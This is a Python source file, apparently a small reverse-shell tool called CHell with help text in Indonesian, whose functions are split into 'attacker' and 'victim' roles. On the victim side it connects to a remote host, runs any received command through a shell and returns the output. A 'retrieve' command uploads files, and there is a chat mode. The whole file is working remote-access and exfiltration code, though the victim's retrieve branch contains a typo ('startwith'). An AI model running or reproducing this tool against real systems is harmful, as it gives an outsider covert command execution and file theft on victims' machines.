from getopt import getopt
import sys
from threading import Thread
import subprocess
import os
import socket

IP = ""
PORT = 1000
LISTEN = False
CHAT = False


def attacker():
    attack_socket = socket.socket()

    attack_socket.bind((IP, PORT))
    attack_socket.listen(1)
    print(f"Listening on {IP} | {PORT}")
    vict_socket, (ip, port) = attack_socket.accept()
    print(f"Connected with victim at {ip}|{port}")

    if CHAT:
        attacker_chat(vict_socket)
    else:
        attacker_command(vict_socket)

    attack_socket.close()
    print("program is closed")


def attacker_chat(vict_socket):
    send_thread = Thread(target=attacker_send_chat, args=(vict_socket,))
    recv_thread = Thread(target=attacker_recv_chat, args=(vict_socket,))
    send_thread.start()
    recv_thread.start()
    send_thread.join()
    recv_thread.join()


def attacker_send_chat(vict_socket):
    while True:
        try:
            message = input("Send : ")
            if message == "exit":
                vict_socket.close()
                break
            elif message == "":
                print("cannot send empty message")
                continue
            message = message.encode()
            vict_socket.send(message)
        except:
            break


def attacker_recv_chat(vict_socket):
    while True:
        try:
            received = vict_socket.recv(2048)
            if received != b'':
                received = received.decode()
                print("Received : " + received)
        except:
            break


def attacker_command(vict_socket):
    skipped = False
    while True:
        try:
            if skipped:
                skipped = False
            else:
                path = vict_socket.recv(2048).decode()
            command = input(path+">")
            if command == "exit":
                vict_socket.close()
                break
            elif command == "":
                print("cannot send empty command")
                skipped = True
                continue
            vict_socket.send(command.encode())
            if command[:2] == "cd":
                continue
            elif command.startswith("retrieve"):
                file_name = command.split(" ")[1]
                file_pointer = open("retrieved_" + file_name, "wb")
                while True:
                    content = vict_socket.recv(2048)
                    if content == b'done':
                        break
                    file_pointer.write(content)
                file_pointer.close()
            else:
                response = vict_socket.recv(2048).decode()
                if response != "nooutput":
                    print(response)
        except Exception as e:
            print(e)
            break


def victim():
    vict_socket = socket.socket()

    vict_socket.connect((IP, PORT))

    if CHAT:
        victim_chat(vict_socket)
    else:
        victim_recv_command(vict_socket)

    vict_socket.close()


def victim_chat(vict_socket):
    send_thread = Thread(target=victim_send_chat, args=(vict_socket,))
    recv_thread = Thread(target=victim_recv_chat, args=(vict_socket,))
    send_thread.start()
    recv_thread.start()
    send_thread.join()
    recv_thread.join()


def victim_send_chat(vict_socket):
    while True:
        try:
            message = input("Send : ")
            if message == "exit":
                vict_socket.close()
                break
            elif message == "":
                print("cannot send empty message")
                continue
            message = message.encode()
            vict_socket.send(message)

        except:
            break


def victim_recv_chat(vict_socket):
    while True:
        try:
            received = vict_socket.recv(2048)
            if received != b'':
                received = received.decode()
                print("Received :" + received)
        except:
            break


def victim_recv_command(vict_socket):
    while True:
        try:
            path = os.getcwd()
            vict_socket.send(path.encode())
            command = vict_socket.recv(2048).decode()
            if command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except:
                    vict_socket.send("invalid directory!".encode())
            elif command.startwith("retrieve"):
                file_name = command.split(" ")[1]
                file_pointer = open(file_name, "rb")
                while True:
                    content = file_pointer.read(2048)
                    if content == b'':
                        break
                    vict_socket.send(content)
                vict_socket.send("done".encode())
                file_pointer.close()
            else:
                process = subprocess.Popen(
                    args=command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                output, err = process.communicate()
                if err != b'':
                    # ada error
                    vict_socket.send(err)
                elif output != b'':
                    vict_socket.send(output)
                elif output == b'':
                    vict_socket.send("nooutput".encode())
        except:
            break


def help():
    print("Struktur Command yang benar:")
    print("python CHell.py -i 127.0.0.1 -p 2222 -l -c -h")
    print("setelah perintah -i masukkan ip")
    print("setelah perintah -p masukkan port yang akan digunakan")
    print("-l digunakan untuk menetukan siapa yang attacker dan victim")
    print("-c digunakan untuk mode chat")
    print("-h digunakan untuk help")


def check_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except:
        return False


def process():
    if LISTEN:
        attacker()
    else:
        victim()


def main():
    global IP, PORT, CHAT, LISTEN
    opts, _ = getopt(sys.argv[1:], "i:p:lch", [
                     "ip=", "port=", "listen", "chat", "help"])
    for key, value in opts:
        if key in ["-i", "--ip"]:
            IP = value
        elif key in ["-p", "--port"]:
            PORT = int(value)
        elif key in ["-l", "--listen"]:
            LISTEN = True
        elif key in ["-c", "--chat"]:
            CHAT = True
        elif key in ["-h", "--help"]:
            help()

    if check_ip(IP) and PORT >= 0 and PORT <= 8000:
        process()
    else:
        print("invalid")
    pass


if __name__ == "__main__":
    main()
